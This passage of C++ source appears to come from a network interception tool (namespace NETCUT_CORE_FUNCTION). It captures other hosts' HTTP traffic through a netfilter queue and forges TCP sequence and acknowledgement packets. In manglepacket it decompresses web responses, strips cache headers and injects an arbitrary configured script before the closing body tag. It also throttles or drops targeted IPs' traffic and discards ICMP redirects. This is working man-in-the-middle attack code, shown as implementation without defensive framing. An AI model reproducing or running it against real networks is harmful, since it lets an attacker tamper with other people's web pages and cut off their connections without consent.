 this->sendTCP((const unsigned char *) mymac,
 (const unsigned char *) clientmac,
 p_IPBuffer->ip_src.s_addr, p_IPBuffer->ip_dst.s_addr,
 ntohs(tcp->source_port), ntohs(tcp->dest_port),
 p_connbuff.nLastSeq2Client, p_connbuff.nLastAck2Client,
 TH_ACK, (unsigned char *) p_connbuff.payload + nlastindex,
 nbuffersize);
 }
 //Use server's packet ACK as my SEQ, as I do not send any data to server
 //use server's SEQ + payload as ACK, As I do get those data
 //	virtual bool sendTCP(u_int p_nSaddr, u_int p_nDaddr,unsigned short int p_nSport,unsigned short int p_nDport,unsigned int p_nSeq,unsigned int p_nAck,u_int8_t p_nConBits,unsigned char * p_Data, unsigned int p_nDataSize);

 }
 if (ntohs(tcp->dest_port) == 80) {

 char mymac[6];
 char dstmac[6];
 if (!GetMyMac(mymac)
 || !GetMacofDstIP(p_IPBuffer->ip_src.s_addr, dstmac)) {
 TRACE("No Gate MAC found yet\n");
 return false;
 }

 TRACE(
 "Got client  %s packet ack %u seq %u size %d Last confirmed ACK is %u \n",
 p_connbuff.filename, ntohl(tcp->acknowledge),
 ntohl(tcp->sequence), tcppayloadsize,
 p_connbuff.nConfirmedClientACK);

 if (ntohl(tcp->acknowledge) >= p_connbuff.nConfirmedClientACK) {
 p_connbuff.nConfirmedClientACK =
 ntohl(tcp->acknowledge) > p_connbuff.nConfirmedClientACK ?
 ntohl(tcp->acknowledge) :
 p_connbuff.nConfirmedClientACK;
 p_connbuff.nLastAck2Client = ntohl(tcp->sequence) + tcppayloadsize;
 p_connbuff.nLastSeq2Client = p_connbuff.nConfirmedClientACK;

 int nDataOffset = p_connbuff.nLastSeq2Client
 - p_connbuff.nDataBeginSeq;

 if (nDataOffset < p_connbuff.nBufferedSize) {
 int nSendBuffer = p_connbuff.nBufferedSize - nDataOffset;
 if (nSendBuffer > 1024)
 nSendBuffer = 1024;
 this->sendTCP((const unsigned char *) mymac,
 (const unsigned char *) dstmac,
 p_IPBuffer->ip_dst.s_addr, p_IPBuffer->ip_src.s_addr,
 ntohs(tcp->dest_port), ntohs(tcp->source_port),
 p_connbuff.nLastSeq2Client, p_connbuff.nLastAck2Client,
 TH_ACK,
 (unsigned char *) p_connbuff.payload + nDataOffset,
 nSendBuffer);

 TRACE(
 "Send PACKET to client ack %u seq %u %s data size %d of remaining %d\n",
 p_connbuff.nLastAck2Client, p_connbuff.nLastSeq2Client,
 p_connbuff.filename, nSendBuffer,
 p_connbuff.nBufferedSize - nDataOffset);

 if (nDataOffset + nSendBuffer == p_connbuff.nBufferedSize) {
 this->sendTCP((const unsigned char *) mymac,
 (const unsigned char *) dstmac,
 p_IPBuffer->ip_dst.s_addr,
 p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
 ntohs(tcp->source_port),
 p_connbuff.nLastSeq2Client + nSendBuffer,
 p_connbuff.nLastAck2Client,
 TH_ACK | TH_FIN,
 NULL, 0);
 }
 } else {

 TRACE(
 "ALl data sent out ,Send FIN PACKET to client ack %u seq %u %s\n",
 p_connbuff.nLastAck2Client, p_connbuff.nLastSeq2Client,
 p_connbuff.filename);

 this->sendTCP((const unsigned char *) mymac,
 (const unsigned char *) dstmac,
 p_IPBuffer->ip_dst.s_addr, p_IPBuffer->ip_src.s_addr,
 ntohs(tcp->dest_port), ntohs(tcp->source_port),
 p_connbuff.nLastSeq2Client, p_connbuff.nLastAck2Client,
 TH_ACK | TH_FIN,
 NULL, 0);

 }
 }

 if (tcp->fin) //Client start fin him self, need to ack ++
 {

 TRACE("Got client packet FIN PACKET ack %u seq %u %s\n",
 ntohl(tcp->acknowledge), ntohl(tcp->sequence),
 p_connbuff.filename);

 p_connbuff.nLastAck2Client = ntohl(tcp->sequence) + tcppayloadsize
 + 1;
 p_connbuff.nLastSeq2Client = ntohl(tcp->acknowledge);
 TRACE("Client FIN packet got, I will response FIN/ACK+1 \n");

 this->sendTCP((const unsigned char *) mymac,
 (const unsigned char *) dstmac, p_IPBuffer->ip_dst.s_addr,
 p_IPBuffer->ip_src.s_addr, ntohs(tcp->dest_port),
 ntohs(tcp->source_port), p_connbuff.nLastSeq2Client,
 p_connbuff.nLastAck2Client, TH_ACK,
 NULL, 0);

 return false; // tell caller this is done. can be removed
 }

 }

 return true;
 }

 */

void CPacketFilter::manglepacket(struct connectionvalue & p_connbuff) {

//Get Header Index,
//Set header
//	Cache-Control: private, no-cache, no-store, must-revalidate, max-age=0, proxy-revalidate, s-maxage=0
//	Expires: 0
//	Pragma: no-cache

//  Get Content,  if gzip, unzip, if failed unzip, return without change.
//  Change content by add "hahaha" if it is html add it before</head>
//  <script type="text/javascript"> window.alert("sometext");</script>
//  If Gzip zip && Content-len get size and set header content-len
//  Sender header, send the rest buffer by 14

	if (p_connbuff.nHeaderSize == 0)
		return; // Can only mangle data after header recieved'
	if (p_connbuff.nContentLen > 0 && !p_connbuff.bFinServer)
		return; // can only mangle data when content-len exist and finish load server data

	if (p_connbuff.bChunked && p_connbuff.bGzip && !p_connbuff.bFinServer)
		return;

	if (p_connbuff.bMangled)
		return; //already changed content;

	/*	string sTestInsert =
	 p_connbuff.bHTML ?
	 "<script type=\"text/javascript\"> document.body.style.backgroundColor =\"#6876EA\"\;</script>" :
	 "document.body.style.backgroundColor =\"#6876EA\"\;";
	 */
	string sTestInsert;

	if (p_connbuff.bHTML) {
		sTestInsert += "<script type=\"text/javascript\">";
		sTestInsert += m_sDataStr;
		sTestInsert += "</script>";

	} else {
		sTestInsert = this->m_sDataStr;
	}

	string sBeforeTag = "</body>";

	// Set headers
	string sheader;
	sheader.append(p_connbuff.payload, p_connbuff.nHeaderSize);
	SetHeader(sheader, "Cache-Control:",
			"private, no-cache, no-store, must-revalidate, max-age=0, proxy-revalidate, s-maxage=0");
	SetHeader(sheader, "Expires:", "0");
	SetHeader(sheader, "Pragma:", "no-cache");
	SetHeader(sheader, "Connection", "close");
	this->RemoveHeader(sheader, "ETag:");
	RemoveHeader(sheader, "Accept-Ranges:");

	//int nChunkContentIndex=p_connbuff.nDataLastSentIndex<p_connbuff.nHeaderSize?p_connbuff.nHeaderSize:p_connbuff.nDataLastSentIndex;
	// Change content
	string sContent;
	string sPrebuffer;
	if (p_connbuff.bChunked) {
		//	this->RemoveHeader(sheader, "Transfer-Encoding:");

		sPrebuffer = this->GetChunkedContent(
				(char *) (p_connbuff.payload + p_connbuff.nHeaderSize),
				p_connbuff.nBufferedSize - p_connbuff.nHeaderSize);
		if (sPrebuffer == "") {
	//		TRACE("Unable to decode Chunk\n");
			return;
		}
	} else {
		sPrebuffer.append(
				(char *) (p_connbuff.payload + p_connbuff.nHeaderSize),
				p_connbuff.nBufferedSize - p_connbuff.nHeaderSize);
	}

	if (p_connbuff.bGzip) {
		CZlib depress;
		if (!depress.UnCompress((unsigned char *) (sPrebuffer.c_str()),
				sPrebuffer.size())) {
		//	TRACE("depress failed\n");
			return;
		}
		sContent.append((char *) depress.m_pResult, depress.m_nResultSize);
	} else {
		sContent.append((char *) (sPrebuffer.c_str()), sPrebuffer.size());
	}

	if (p_connbuff.bHTML) {
		int nPos = sContent.find(sBeforeTag);
		if (nPos == string::npos) {

			std::transform(sBeforeTag.begin(), sBeforeTag.end(),
					sBeforeTag.begin(), ::toupper);
			nPos = sContent.find(sBeforeTag);
		}
		if (nPos != string::npos) {
			sContent.insert(nPos, sTestInsert);
		}

	} else {
		sContent.insert(0, sTestInsert);
	}

	if (p_connbuff.bGzip) {
		CZlib compress;
		if (!compress.Compress((unsigned char *) sContent.c_str(),
				sContent.size()))
			return;

		if (compress.m_nResultSize > MAXHTTPDATA_BUFF_SIZE)
			return;
		sContent = "";
		sContent.append((char *) compress.m_pResult, compress.m_nResultSize);
	}

	RemoveHeader(sheader, "Transfer-Encoding:");

	p_connbuff.nContentLen = sContent.size();
	SetHeader(sheader, "Content-Length:", to_string(p_connbuff.nContentLen));

	//Write changed header + content back to payload
	memcpy(p_connbuff.payload, sheader.c_str(), sheader.size());
	p_connbuff.nHeaderSize = sheader.size();

	memcpy(p_connbuff.payload + p_connbuff.nHeaderSize, sContent.c_str(),
			sContent.size());

	p_connbuff.nBufferedSize = sheader.size() + sContent.size();
	p_connbuff.bMangled = true;

	//Set header conten len is required
	/*

	 if (p_connbuff.nContentLen > 0) {
	 p_connbuff.nContentLen = sContent.size();
	 SetHeader(sheader, "Content-Length:",
	 to_string(p_connbuff.nContentLen));

	 //Write changed header + content back to payload
	 memcpy(p_connbuff.payload, sheader.c_str(), sheader.size());
	 p_connbuff.nHeaderSize = sheader.size();

	 memcpy(p_connbuff.payload + p_connbuff.nHeaderSize, sContent.c_str(),
	 sContent.size());

	 p_connbuff.nBufferedSize = sheader.size() + sContent.size();
	 p_connbuff.bMangled = true;
	 }

	 if (p_connbuff.bChunked) {

	 string sChunkedContent = MakeChunkedContent((char *) sContent.c_str(),
	 sContent.size());
	 if(p_connbuff.bFinServer) sChunkedContent.append("0\r\n\r\n");
	 memcpy(p_connbuff.payload + nChunkContentIndex,
	 sChunkedContent.c_str(), sChunkedContent.size());
	 p_connbuff.nBufferedSize = nChunkContentIndex
	 + sChunkedContent.size();
	 p_connbuff.bMangled = true;



	 }
	 */
}

void CPacketFilter::RemoveHeader(string & p_header,
		const string p_sHeaderControl) {	   //SetHeader(s,"Expires:","0");

	string sSection = p_sHeaderControl;
	int nPos = p_header.find("\r\n" + p_sHeaderControl);
	int nEndPos = -1;

	if (nPos != string::npos) {
		nPos += 2;
		nEndPos = p_header.find("\r\n", nPos);
		if (nEndPos == -1)
			return;	   //Bad header
		nEndPos += 2;

		p_header.erase(nPos, nEndPos - nPos);
	}

}
void CPacketFilter::SetHeader(string & p_header, const string p_sHeaderControl,
		const string p_sHeaderValue) {	   //SetHeader(s,"Expires:","0");

	string sSection = p_sHeaderControl + " " + p_sHeaderValue + "\r\n";
	int nPos = p_header.find("\r\n" + p_sHeaderControl);
	int nEndPos = -1;

	if (nPos != string::npos) {
		nPos += 2;
		nEndPos = p_header.find("\r\n", nPos);
		if (nEndPos == -1)
			return;	   //Bad header
		nEndPos += 2;

		p_header.replace(nPos, nEndPos - nPos, sSection);
	} else {
		nPos = p_header.find("\r\n\r\n");
		nPos += 2;
		p_header.insert(nPos, sSection);

	}

}

int CPacketFilter::GetHeaderSize(char * p_buff) {

	char * s = strstr(p_buff, "\r\n\r\n");
	if (s != NULL)
		return s - p_buff + 4;

	return 0;

}

string CPacketFilter::GetChunkedContent(char * p_buff,
		unsigned int p_nBufSize) {
	string sBlockBuff;
	string sbuf;
	sbuf.append((const char *) p_buff, p_nBufSize);

	/*
	 * Read line, read hex, convert hex to int. read int bytes from rest.
	 *
	 *
	 */
	int nPosStart = 0;
	int nPosEnd = 0;
	while (nPosStart < p_nBufSize) //when nPosStart beyond p_nBufSize it is end too
	{
		nPosEnd = sbuf.find("\r\n", nPosStart); //find hex number finish
		if (nPosEnd == string::npos)
			return "";

		string sHex = sbuf.substr(nPosStart, nPosEnd - nPosStart);
		int nExtPos = sHex.find("\;");
		if (nExtPos != string::npos) {
			sHex = sbuf.substr(nPosStart, nExtPos - nPosStart);
		}
		int number = (int) strtol(sHex.c_str(), NULL, 16); //get len number
		nPosStart = nPosEnd + 2; //move start to block start
		if (number == 0)
			return sBlockBuff; // this is the end of total chunk content
		sBlockBuff.append((const char *) p_buff + nPosStart, number); //append chunked content to string Blockbuff
		nPosStart += (number + 2); //move Posstart to next line.

	}

	return sBlockBuff;

}

string CPacketFilter::MakeChunkedContent(char * p_buff,
		unsigned int p_nBufSize) {
	string sBlockBuff;

	/*
	 * Read line, read hex, convert hex to int. read int bytes from rest.
	 *
	 *
	 */
	std::stringstream stream;
	stream << std::hex << p_nBufSize;
	std::string sheader(stream.str());

	sBlockBuff.append(sheader.c_str(), sheader.size());
	sBlockBuff.append("\r\n");
	if (p_nBufSize > 0)
		sBlockBuff.append((const char *) p_buff, p_nBufSize);
	sBlockBuff.append("\r\n");
	return sBlockBuff;

}

bool CPacketFilter::IsChunkedFinish(char * p_buff, unsigned int p_nBufSize) {
	if (p_nBufSize < 5)
		return false;

	if (0 == memcmp(p_buff + p_nBufSize - 5, "0\r\n\r\n", 5))
		return true;

	return false;
}

bool CPacketFilter::IsMarkedTCPWindow(const struct sniff_ip * p_IPBuffer,
		int p_nBufSize) {

	int size_ip = IP_HL(p_IPBuffer) * 4;

	const struct tcp_header * tcp = (struct tcp_header *) ((u_char*) p_IPBuffer
			+ size_ip);

	/*	TRACE("SRC IP %s, DST IP %s src tcp %d dst tcp %d window %d\n",
	 CAddressHelper::IntIP2str(p_IPBuffer->ip_src.s_addr).c_str(),
	 CAddressHelper::IntIP2str(p_IPBuffer->ip_dst.s_addr).c_str(),
	 ntohs(tcp->source_port), ntohs(tcp->dest_port),ntohs(tcp->window));
	 */

	if (ntohs(tcp->window) == TCP_WINDOW_SIGN_ID) {
		return true;
	}
	return false;

}

void CPacketFilter::CleanUpConnectionHandler() {

	for (auto it = m_httphandleconnection.cbegin();
			it != m_httphandleconnection.cend() /* not hoisted */;
			/* no increment */) {

		if (::_helper_GetMiTime() - it->second.nLastHandledTime > 1000 * 60) { //If more than 1 minutes passed , remove it.
			m_httphandleconnection.erase(it++);
		//	TRACE("Remove connection , too long no handled\n");
		} else {
			++it;
		}
	}

}

int CPacketFilter::OnIPRedirectControl(const struct sniff_ip * p_IPBuffer,
		int p_nBufSize) {
	/*
	 * Check if packet is ICMP redirect packet , and dst gateway is real gateway or not.
	 * if it is real gateway , drop it.
	 *
	 */

	int nReturnCode = NF_ACCEPT;
	do {

		if (p_IPBuffer->ip_p != IPPROTO_ICMP)
			break;

		int size_ip = IP_HL(p_IPBuffer) * 4;

		const libnet_icmpv4_hdr * icmp =
				(struct libnet_icmpv4_hdr *) ((u_char*) p_IPBuffer + size_ip);

		int payloadsize = p_nBufSize - size_ip;

		if (ICMP_REDIRECT == icmp->icmp_type) {
			nReturnCode = NF_DROP;
			break;
		}

	} while (false);

	if (nReturnCode != NF_ACCEPT) {
	//	TRACE("Drop ICMP packet\n");
	}
	return nReturnCode;
}

void CPacketFilter::SetIPPacketFilterTimeStamp(DWORD p_nIP) {
	m_lock.lock();
	m_SpeedControl[p_nIP].nLastDataMangleTime = ::_helper_GetTimeSeconds();

	m_lock.unlock();
}
int CPacketFilter::OnIPSpeedControl(const struct sniff_ip * p_IPBuffer,
		int p_nBufSize, bool & p_bneedPacketFilter) {
	/*
	 * Check last second speed is it bigger than threhold, if yes, return drop.
	 * if no, return accept and add to it's transfer data size (upload/download)
	 */

	m_lock.lock();

	int nReturnCode = NF_ACCEPT;
	do {

		DWORD nTargetIP = 0;
		if (this->m_SpeedControl.find(p_IPBuffer->ip_dst.s_addr)
				!= m_SpeedControl.end()) {
			nTargetIP = p_IPBuffer->ip_dst.s_addr;

		} else if (this->m_SpeedControl.find(p_IPBuffer->ip_src.s_addr)
				!= m_SpeedControl.end()) {
			nTargetIP = p_IPBuffer->ip_src.s_addr;

		} else {
			break;
		}

		if (this->m_bHasData && p_IPBuffer->ip_p == IPPROTO_TCP
				&& _helper_GetTimeSeconds()
						- m_SpeedControl[nTargetIP].nLastDataMangleTime
						> MANGLEWAITTIMESECONDS) {
			int size_ip = IP_HL(p_IPBuffer) * 4;

			const struct tcp_header * tcp =
					(struct tcp_header *) ((u_char*) p_IPBuffer + size_ip);

			if (ntohs(tcp->dest_port) == 80 || ntohs(tcp->source_port) == 80)

			{
			//	TRACE("About to filter data\n");
				p_bneedPacketFilter = true;
				break;
			}
		}

		//TRACE("Forwarding packet %s total byte %d current byte %d limite %d\n",CAddressHelper::IntIP2str(nTargetIP).c_str(),m_SpeedControl[nTargetIP].nTotalBytes,m_SpeedControl[nTargetIP].nCurrentSecondTotalBytes,m_SpeedControl[nTargetIP].nMaxBytePerSecond);

		unsigned long nSec = ::_helper_GetTimeSeconds();

		if (m_SpeedControl[nTargetIP].nCurrentSecond != nSec) {
			m_SpeedControl[nTargetIP].nCurrentSecond = nSec;
			m_SpeedControl[nTargetIP].nCurrentSecondTotalBytes = 0;
		}
		unsigned long long nTotalSecondBite =
				m_SpeedControl[nTargetIP].nCurrentSecondTotalBytes + p_nBufSize;

		if (nTotalSecondBite >= m_SpeedControl[nTargetIP].nMaxBytePerSecond) {
			nReturnCode = NF_DROP;
			break;
		}

		m_SpeedControl[nTargetIP].nCurrentSecondTotalBytes = nTotalSecondBite;
		m_SpeedControl[nTargetIP].nTotalBytes += p_nBufSize;

	} while (false);

	m_lock.unlock();

	if (nReturnCode != NF_ACCEPT) {
		TRACE("Drop packet\n");
	}
	return nReturnCode;
}
/*

 int CPacketFilter::OnIPSpeedControl(const struct sniff_ip * p_IPBuffer,
 int p_nBufSize) {

 #define BILLION  1000000000L;
 struct timespec start, stop;
 double accum;

 if (clock_gettime( CLOCK_REALTIME, &start) == -1) {
 perror("clock gettime");
 return NF_ACCEPT;
 }

 m_lock.lock();

 if (clock_gettime( CLOCK_REALTIME, &stop) == -1) {
 perror("clock gettime");
 return NF_ACCEPT;
 }

 accum = (stop.tv_sec - start.tv_sec)
 + (double) (stop.tv_nsec - start.tv_nsec) / (double) BILLION;
 TRACE("lock cost %lf\n", accum);

 int nReturnCode = NF_ACCEPT;
 do {

 if (clock_gettime( CLOCK_REALTIME, &start) == -1) {
 perror("clock gettime");
 return NF_ACCEPT;
 }
 DWORD nTargetIP;
 if (this->m_SpeedControl.find(p_IPBuffer->ip_dst.s_addr)
 != m_SpeedControl.end()) {
 nTargetIP = p_IPBuffer->ip_dst.s_addr;

 if (clock_gettime( CLOCK_REALTIME, &stop) == -1) {
 perror("clock gettime");
 return NF_ACCEPT;
 }

 accum = (stop.tv_sec - start.tv_sec)
 + (double) (stop.tv_nsec - start.tv_nsec) / (double) BILLION;
 TRACE("MAP finding cost %lf\n", accum);

 } else if (this->m_SpeedControl.find(p_IPBuffer->ip_src.s_addr)
 != m_SpeedControl.end()) {
 nTargetIP = p_IPBuffer->ip_src.s_addr;

 if (clock_gettime( CLOCK_REALTIME, &stop) == -1) {
 perror("clock gettime");
 return NF_ACCEPT;
 }

 accum = (stop.tv_sec - start.tv_sec)
 + (double) (stop.tv_nsec - start.tv_nsec) / (double) BILLION;
 TRACE("2 MAP finding cost %lf\n", accum);

 } else {
 break;
 }



 if (m_SpeedControl[nTargetIP].nMaxBytePerSecond == 0) {
 nReturnCode = NF_ACCEPT;
 break;
 }
 // TRACE("Forwarding packet %s total byte %d current byte %d limite %d\n",CAddressHelper::IntIP2str(nTargetIP).c_str(),m_SpeedControl[nTargetIP].nTotalBytes,m_SpeedControl[nTargetIP].nCurrentSecondTotalBytes,m_SpeedControl[nTargetIP].nMaxBytePerSecond);
 if (clock_gettime( CLOCK_REALTIME, &start) == -1) {
 perror("clock gettime");
 return NF_ACCEPT;
 }
 unsigned long nSec = ::_helper_GetTimeSeconds();

 if (clock_gettime( CLOCK_REALTIME, &stop) == -1) {
 perror("clock gettime");
 return NF_ACCEPT;
 }

 accum = (stop.tv_sec - start.tv_sec)
 + (double) (stop.tv_nsec - start.tv_nsec) / (double) BILLION;
 TRACE("Get time cost %lf\n", accum);

 if (m_SpeedControl[nTargetIP].nCurrentSecond != nSec) {
 m_SpeedControl[nTargetIP].nCurrentSecond = nSec;
 m_SpeedControl[nTargetIP].nCurrentSecondTotalBytes = 0;
 }
 if (clock_gettime( CLOCK_REALTIME, &start) == -1) {
 perror("clock gettime");
 return NF_ACCEPT;
 }
 unsigned long long nTotalSecondBite =
 m_SpeedControl[nTargetIP].nCurrentSecondTotalBytes + p_nBufSize;

 if (clock_gettime( CLOCK_REALTIME, &stop) == -1) {
 perror("clock gettime");
 return NF_ACCEPT;
 }

 accum = (stop.tv_sec - start.tv_sec)
 + (double) (stop.tv_nsec - start.tv_nsec) / (double) BILLION;
 TRACE(" sum bytes cost %lf\n", accum);

 if (nTotalSecondBite >= m_SpeedControl[nTargetIP].nMaxBytePerSecond) {
 nReturnCode = NF_DROP;
 break;
 }

 m_SpeedControl[nTargetIP].nCurrentSecondTotalBytes = nTotalSecondBite;
 m_SpeedControl[nTargetIP].nTotalBytes += p_nBufSize;

 } while (false);

 m_lock.unlock();

 if (nReturnCode != NF_ACCEPT) {
 TRACE("Drop packet\n");
 }
 return nReturnCode;
 }
 */
int CPacketFilter::OnIPPacketFilter(const struct sniff_ip * p_IPBuffer,
		int p_nBufSize) {

	int size_ip = IP_HL(p_IPBuffer) * 4;

	const struct tcp_header * tcp = (struct tcp_header *) ((u_char*) p_IPBuffer
			+ size_ip);

	httpconnection n;

	GetHTTPConnection(p_IPBuffer, n);
	bool bHandledConnection = (this->m_httphandleconnection.find(n)
			!= this->m_httphandleconnection.end());

	/*	if (bHandledConnection) {
	 TRACE("Got packet should be handle\n");
	 } else {
	 //		TRACE("packet not interested\n"); //packet need to check further , no need handler process now.
	 }
	 */

	if (bHandledConnection && m_httphandleconnection[n].nLastAck2Client != 0) { //Got both server and client packet

	//TRACE("Got packet should be handle\n");
		if (IsMarkedTCPWindow(p_IPBuffer, p_nBufSize)) {
		//	TRACE("This is a packet sent by libnet , so let it pass\n");
			return NF_ACCEPT;
		}
		//	TRACE("Got packet should be handle\n");
		if (!this->HTTPHandler(p_IPBuffer, p_nBufSize,
				m_httphandleconnection[n])) {
			//TRACE("Finish handling, remove it\n");
			m_httphandleconnection.erase(n);
			return NF_ACCEPT;
		}

		return NF_DROP;  //this connection already handled

	}

	u_char * tcppayloadbegin = ((u_char*) p_IPBuffer + size_ip
			+ tcp->data_offset * 4);

	int tcppayloadsize = p_nBufSize - tcp->data_offset * 4 - size_ip;

	string s;
	s.append((char *) tcppayloadbegin, tcppayloadsize);

	if (ntohs(tcp->dest_port) == 80 && tcp->psh && tcp->ack
			&& tcppayloadsize > 0) {

		string sUrl;
		string sExt;
		string sApp;
		if (getrequestext(s, sExt) && getrequestapp(s, sApp)
				&& this->IsBrowserOK(sApp) && this->IsExtOK(sExt)) {
			getrequesturl(s, sUrl);
		//	TRACE("Got a GOOD CONNECION %s %s\n", sUrl.c_str(), sApp.c_str());
			memset(&m_httphandleconnection[n], 0,
					sizeof(m_httphandleconnection[n]));
			this->m_httphandleconnection[n].nLastHandledTime =
					_helper_GetMiTime();
			memcpy(m_httphandleconnection[n].filename, sUrl.c_str(),
					sUrl.size() > 250 ? 250 : sUrl.size());

			m_httphandleconnection[n].nLastAck2Server = ntohl(tcp->acknowledge);
			m_httphandleconnection[n].nLastSeq2Server = ntohl(tcp->sequence);

			CleanUpConnectionHandler();

		}

	}
	if (ntohs(tcp->source_port) == 80 && tcp->ack && tcppayloadsize > 0
			&& bHandledConnection) {

		bool bHtml = true;
		bool bChunked = false;
		bool bGzip = false;
		unsigned int nlen = 0;

		do {
			if (!this->IsNeededHTTPResponse(s, bHtml, bGzip, bChunked, nlen)) //not a good response to buffer
				break;

			if (IPPACKET_BUFF_SIZE < p_nBufSize) {
				break;  //Can not hold this packet
			}

			m_httphandleconnection[n].bHTML = bHtml;
			m_httphandleconnection[n].bChunked = bChunked;
			m_httphandleconnection[n].nContentLen = nlen;
			m_httphandleconnection[n].bGzip = bGzip;
			m_httphandleconnection[n].nBufferedSize = 0;
			m_httphandleconnection[n].nDataLastSentIndex = 0;

			m_httphandleconnection[n].nHeaderSize = 0;
			m_httphandleconnection[n].nLastAck2Client = ntohl(tcp->acknowledge);
			m_httphandleconnection[n].nLastSeq2Client = ntohl(tcp->sequence);
			m_httphandleconnection[n].nDataBeginSeq = ntohl(tcp->sequence);
			m_httphandleconnection[n].bFinServer = false;
			m_httphandleconnection[n].bFinClient = false;
			m_httphandleconnection[n].bMangled = false;

//			TRACE("Got Server response, start handle \n%s\n", s.c_str());
			if (!this->HTTPHandler(p_IPBuffer, p_nBufSize,
					m_httphandleconnection[n])) {
			//	TRACE("Bad first hand shake\n");
				break;
			}
			return NF_DROP;  //this connection already handled
			//return NF_ACCEPT;

		} while (false);

		m_httphandleconnection.erase(n); //server response is not a required packet
	}

	return NF_ACCEPT;

}

int CPacketFilter::cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
		struct nfq_data *nfa, void *data) {

	CPacketFilter *n = (CPacketFilter *) data;
	n->Packethandler(qh, nfa);
	return 1;

}

void CPacketFilter::threadBindQueueRun() {

//	TRACE("netfilter thread started\n");

	int rv;
	char buf[4096] __attribute__ ((aligned));

	do {
		bool bWarning = false;

		//m_bIpTableExist = true;

		for (;;) {

			m_ExitEvent.Reset();
			m_ExitEvent.SetFD(m_fd);

			if (m_ExitEvent.WaitIO() && m_ExitEvent.IsIOON(m_fd)) {

				if ((rv = recv(m_fd, buf, sizeof(buf), 0)) >= 0) {
					//		printf("pkt received\n");
					nfq_handle_packet(m_h, buf, rv);
					continue;
				}
				/* if your application is too slow to digest the packets that
				 * are sent from kernel-space, the socket buffer that we use
				 * to enqueue packets may fill up returning ENOBUFS. Depending
				 * on your application, this error may be ignored. Please, see
				 * the doxygen documentation of this library on how to improve
				 * this situation.
				 */
				if (rv < 0 && errno == ENOBUFS) {
			//		TRACE("losing packets!\n");
					continue;
				}
			}

			//	TRACE("recv failed");
			break;
		}
	} while (false);

	//TRACE("netfilter thread Finisheds\n");

}

} /* namespace NETCUT_CORE_FUNCTION */
